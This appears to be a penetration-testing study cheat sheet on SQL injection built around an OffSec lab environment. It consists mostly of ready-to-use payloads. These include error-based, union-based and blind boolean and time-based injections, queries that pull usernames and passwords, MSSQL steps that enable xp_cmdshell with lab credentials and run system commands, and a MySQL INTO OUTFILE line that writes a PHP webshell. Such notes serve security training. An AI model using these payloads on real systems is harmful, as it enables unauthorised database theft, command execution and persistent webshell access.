# SQL Injection

### Mysql

```
select version();
select system_user();
show databases;
```

### MSSQL

```
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```

## Manual Exploitation

### Error-Based

```
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

### Union-Based

If we get In-Band SQLi where reesult displayed along with the application returned value, we should try for UNION SQLi attacks to work, which we first need to satisfy two conditions:

* The injected UNION query has to include the same number of columns as the original query.
* The data types need to be compatible between each column.

```
# Check how many columns are there
' ORDER BY 1-- //

# If there's 6 column, we can try below query
%' UNION SELECT database(), user(), @@version, null, null -- //

# If first query didn't show because normally for id, we can try below
' UNION SELECT null, null, database(), user(), @@version  -- //

# Enumerate information_schema.tables
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

' UNION SELECT null, username, password, description, null, from users-- -
```

### Blind

* Web app doesn't directly display database reponses.
* Infer information indirectly by how the web application behaves

**Boolean-based Blind SQL Injection**\
The attacker sends SQL queries that evaluate to `TRUE` or `FALSE`. Depending on the result:

* The application behaves differently (e.g., displays or hides content).
* The attacker can deduce whether a condition is true or false.

Example payload:

```
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
```

**Time-based Blind SQL Injection**\
The attacker uses SQL queries that cause delays when a condition is true. By **measuring response time**, they deduce whether the condition is met.

Example payload:

```
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3), 'false') -- //
```

* If `1=1` (true), the database waits for 3 seconds before responding.
* If false, the response is immediate.

This method is slower but can uncover similar information.

### Manual Code Execution

#### MSSQL Code Execution

* xp\_cmdshell take string and passes to command shell for execution
* disable by default, but administrator can enable
* Must be called with EXECUTE instead of SELECT

```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';
```

* After getting cmdshell, can get reverse shell

#### MySQL Code Execution

* Abuse SELECT INTO\_OUTFILE statement to write files to the web server

```
' UNION SELECT "<PHP WEBSHELL ONE LINER>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
